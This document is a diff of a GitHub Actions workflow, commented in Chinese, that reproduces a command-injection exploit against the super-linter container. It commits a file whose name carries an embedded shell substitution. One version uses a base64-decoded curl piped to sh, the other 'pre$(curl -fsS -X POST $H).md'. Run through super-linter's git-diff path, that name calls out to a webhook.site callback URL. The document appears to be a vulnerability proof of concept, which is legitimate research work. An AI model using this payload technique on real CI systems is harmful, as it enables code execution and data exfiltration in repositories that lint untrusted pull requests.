@@ -4,11 +4,11 @@ on:
   workflow_dispatch:
     inputs:
       target_version:
-        description: 'The tag of super-linter to test (e.g., v7, v8, slim-v8.2.1)'
+        description: 'Target version'
         required: true
         default: 'v7'
       webhook_url:
-        description: 'Your webhook.site URL to receive the callback'
+        description: 'Webhook URL'
         required: true
         default: 'https://webhook.site/YOUR-UUID-HERE'
 
@@ -16,54 +16,45 @@ jobs:
   repro-exploit:
     runs-on: ubuntu-latest
     steps:
-      - name: Checkout Code
+      - name: Checkout
         uses: actions/checkout@v4
 
-      - name: 1. Setup Git & Inject Malicious File
+      - name: 1. Setup Git & Payload
         run: |
-          # --- 关键步骤：重置 Git 环境以模拟 PR ---
-          
-          # 1. 删除原本的 .git，我们要自己控制历史
+          # 1. 重置 Git 环境 (模拟 PR 状态)
           rm -rf .git
           git init
-          # 配置假用户，因为 commit 需要
-          git config --global user.email "security@test.com"
-          git config --global user.name "SecurityTest"
+          git config --global user.email "attacker@example.com"
+          git config --global user.name "Attacker"
           
-          # 2. 创建基准分支 (master)
-          echo "# Safe Code" > README.md
+          # 2. 创建基准分支
+          echo "safe" > README.md
           git add README.md
-          git commit -m "Initial safe commit"
+          git commit -m "init"
           git branch -m master
           
-          # 3. 构造恶意文件名 (使用 Base64 技巧)
-          # 解码后命令: curl -fsS -X POST [URL] -d ...
-          ATTACK_CMD="curl -fsS -X POST \"${{ inputs.webhook_url }}\" -d \"vulnerable_version=${{ inputs.target_version }}\""
-          ENCODED_CMD=$(echo -n "$ATTACK_CMD" | base64 -w0)
-          PAYLOAD="pre\$(echo $ENCODED_CMD|base64 -d|sh).md"
+          # 3. 构造 Payload (环境变量法)
+          # 注意：文件名里只有变量名 $H，没有斜杠，所以 touch 不会报错！
+          # 我们用单引号包围，防止在当前 Runner Shell 里被展开
+          PAYLOAD_NAME='pre$(curl -fsS -X POST $H).md'
           
-          echo "Creating malicious file: $PAYLOAD"
-          touch "$PAYLOAD"
+          echo "Creating file: $PAYLOAD_NAME"
+          touch "$PAYLOAD_NAME"
           
-          # 4. 【核心修正】必须提交！
-          # Super-Linter 的 git diff/ls-tree 逻辑看不见未提交的文件
-          git add "$PAYLOAD"
-          git commit -m "Add malicious payload"
+          # 4. 提交恶意文件 (必须提交，否则 git diff 看不到)
+          git add "$PAYLOAD_NAME"
+          git commit -m "add exploit"
           
-          # 5. 保存当前 Commit SHA 供 Docker 使用
+          # 5. 记录 Commit SHA
           echo "CURRENT_SHA=$(git rev-parse HEAD)" >> $GITHUB_ENV
 
-      - name: 2. Run Super-Linter via Docker
-        # 即使报错也继续，方便看结果
+      - name: 2. Run Super-Linter (Trigger Exploit)
         continue-on-error: true
         run: |
-          echo "Testing against image version: ${{ inputs.target_version }}"
+          echo "Testing against: ${{ inputs.target_version }}"
           
-          # 核心参数配置：
-          # RUN_LOCAL=true              : 本地模式
-          # VALIDATE_ALL_CODEBASE=false : 强制走 Git Diff 逻辑 (触发漏洞的路径)
-          # DEFAULT_BRANCH=master       : 告诉它对比目标是 master
-          # GITHUB_SHA=...              : 告诉它当前 Commit 是哪个
+          # 这里的 H 变量就是我们传入的 Webhook URL
+          # 容器内的 Shell 在处理文件名时会展开 $H
           
           docker run --rm \
             -e RUN_LOCAL=true \
@@ -71,10 +62,10 @@ jobs:
             -e DEFAULT_BRANCH=master \
             -e GITHUB_SHA=${{ env.CURRENT_SHA }} \
             -e GITHUB_TOKEN=${{ secrets.GITHUB_TOKEN }} \
+            -e H="${{ inputs.webhook_url }}" \
             -v "$(pwd):/tmp/lint" \
             ghcr.io/super-linter/super-linter:${{ inputs.target_version }}
             
       - name: 3. Verify
         run: |
-          echo "Exploit attempt finished."
-          echo "If successful, you should see a POST request at: ${{ inputs.webhook_url }}"
+          echo "Done. Please check ${{ inputs.webhook_url }}"
